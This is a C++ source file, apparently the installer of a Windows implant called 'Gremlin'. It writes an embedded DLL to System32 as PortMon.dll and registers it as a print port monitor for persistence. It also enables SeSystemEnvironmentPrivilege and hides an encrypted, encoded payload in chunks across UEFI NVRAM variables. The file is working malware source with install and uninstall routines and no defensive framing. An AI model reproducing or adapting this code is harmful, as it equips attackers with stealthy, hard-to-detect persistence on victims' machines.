#include "Gargoyle.h"
#include "EnablePrivilege.h"
#include "Helpers.h"
#include "UEFI.h"
#include "Base64.h"
#include "DPAPI.h"
#include "resource.h"

#pragma comment(lib, "Winspool.lib")

// Constants
// ------------------------------------------------------------------------

#define STAGER_DEST "C:\\Windows\\System32\\PortMon.dll"
#define MONITOR_NAME "PortMonitor"
#define MONITOR_ENV "Windows x64"
#define MONITOR_DLL "PortMon.dll"

// Chunk the downloaded payload and write the chunks into NVRAM variables
// ------------------------------------------------------------------------

BOOL write_payload(std::string payload) {
	// Init NVRAM var counter
	int counter = 1;

    // Chunk the payload into small tokens
	for (unsigned int i = 0; i < payload.length(); i += CHUNK_SIZE) {
		std::string chunk = payload.substr(i, CHUNK_SIZE);

        // Init the NVRAM vars
		std::string sName = NVRAM_VAR_NAME + std::to_string(counter);
		LPCSTR lpName = sName.c_str();
		LPCSTR lpGuid = convert_name_to_guid(lpName);

	    // Check if we are crossing the max NVRAM vars that can be created
		if (counter > MAX_NVRAM_VAR)
			return FALSE;

	    // Write the payload to NVRAM vars
		if (!write_nvram(lpName, lpGuid, chunk.c_str()))
			return FALSE;

		counter ++;
	}

	return TRUE;
}

// Delete all NVRAM vars containing payload
// ------------------------------------------------------------------------

BOOL delete_payload() {
	for (unsigned int i = 1; i <= MAX_NVRAM_VAR; i++) {
	    // Init the NVRAM vars
		std::string sName = NVRAM_VAR_NAME + std::to_string(i);
		LPCSTR lpName = sName.c_str();
		LPCSTR lpGuid = convert_name_to_guid(lpName);
		if (!delete_nvram(lpName, lpGuid))
			break;
	}
	return TRUE;
}

// To install Gremlin implant on host
// ------------------------------------------------------------------------

BOOL install(HMODULE hMod) {
	// Check whether UEFI is supported on the target
	if (!check_uefi())
		return FALSE;

    // Enable SeSystemEnvironmentPrivilege privilege
	BOOL bResult = enable_privilege(SE_SYSTEM_ENVIRONMENT_NAME);
	if (!bResult)
		return FALSE;

	// Retrieve Gremlin implant from resource section
	//HMODULE hMod = GetModuleHandle(NULL);

	HRSRC gremlinRC = FindResourceA(hMod, MAKEINTRESOURCE(RID_GREMLIN), "BINARY");
	std::string gremlin = std::string(
		(LPCSTR)(LockResource(LoadResource(hMod, gremlinRC))),
		SizeofResource(hMod, gremlinRC)
	);

	if (gremlin.empty())
		return FALSE;

	// Retrieve payload from resource section
	HRSRC payloadRC = FindResourceA(hMod, MAKEINTRESOURCE(RID_PAYLOAD), "BINARY");
	std::string payload = std::string(
		(LPCSTR)(LockResource(LoadResource(hMod, payloadRC))),
		SizeofResource(hMod, payloadRC)
	);

	if (payload.empty())
		return FALSE;

	// Encrypt payload blob
	std::string payloadEnc = env_encrypt(payload);

	// Base64URL encode the encrypted payload
	std::string payloadB64 = base64url_encode(payloadEnc);

	// [DEBUG]
	//std::string err = "[DBG] Payload length: " + std::to_string(payload.length());
    //OutputDebugStringA(err.c_str());

	// Write Gremlin implant to System32
	DWORD written;
	HANDLE hStager = CreateFile(STAGER_DEST, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hStager, gremlin.data(), gremlin.size(), &written, FALSE);
	CloseHandle(hStager);

	// Register the Gremlin implant now
	MONITOR_INFO_2 monitorInfo;
	TCHAR env[12] = TEXT(MONITOR_ENV);
	TCHAR name[12] = TEXT(MONITOR_NAME);
	TCHAR dll[12] = TEXT(MONITOR_DLL);
	monitorInfo.pName = name;
	monitorInfo.pEnvironment = env;
	monitorInfo.pDLLName = dll;
	BOOL flag = AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
	if (flag == 0)
		return FALSE;

	// Write the payload to NVRAM
	if (!write_payload(payloadB64))
		return FALSE;

	// [DEBUG]
	//OutputDebugStringA("[DBG] Installation completed successfully!");

	return TRUE;
}

// To uninstall Gremlin implant from host
// ------------------------------------------------------------------------

BOOL uninstall() {
	// Deregister Gremlin implant
	TCHAR name[12] = TEXT(MONITOR_NAME);
	TCHAR env[12] = TEXT(MONITOR_ENV);
	BOOL flag = DeleteMonitor(NULL, env, name);
	if (flag == 0)
		return FALSE;

    // Delete Gremlin implant from disk
	DeleteFile(STAGER_DEST);

	// Enable SeSystemEnvironmentPrivilege privilege
	BOOL bResult = enable_privilege(SE_SYSTEM_ENVIRONMENT_NAME);
	if (!bResult)
		return FALSE;

	// Wipe the payload from NVRAM variables
	delete_payload();

	// [DEBUG]
	//OutputDebugStringA("[DBG] Uninstallation completed successfully!");

	return TRUE;
}

// Check whether host already contains Gremlin implant
// ------------------------------------------------------------------------

BOOL exists() {
	DWORD stagerCheck = GetFileAttributes(STAGER_DEST);
	return (stagerCheck != INVALID_FILE_ATTRIBUTES);
}

// Our pseudo entry-point
// ------------------------------------------------------------------------

void go(HMODULE hMod) {
	if (exists()) {
		//OutputDebugStringA("[DBG] Uninstalling...");
		uninstall();
	}
	else {
		//OutputDebugStringA("[DBG] Installing...");
		install(hMod);
	}
}